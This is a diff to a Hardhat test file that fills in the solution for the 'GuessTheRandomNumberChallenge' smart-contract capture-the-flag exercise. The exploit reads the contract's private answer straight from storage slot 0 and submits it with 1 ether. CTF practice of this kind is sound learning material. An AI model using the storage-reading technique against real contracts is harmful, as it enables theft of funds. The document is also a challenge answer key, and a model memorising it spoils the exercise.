@@ -1,6 +1,6 @@
 import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
-import { Contract } from 'ethers';
+import { BigNumber, Contract } from 'ethers';
 import { ethers, network } from 'hardhat';
 const { utils, provider } = ethers;
 
@@ -24,9 +24,9 @@ describe('GuessTheRandomNumberChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const slot0 = await ethers.provider.getStorageAt(target.address, 0);
+    const answer = BigNumber.from(slot0).toNumber();
+    await target.connect(attacker).guess(answer ,{value: ethers.utils.parseEther('1')})
 
     expect(await target.isComplete()).to.equal(true);
   });
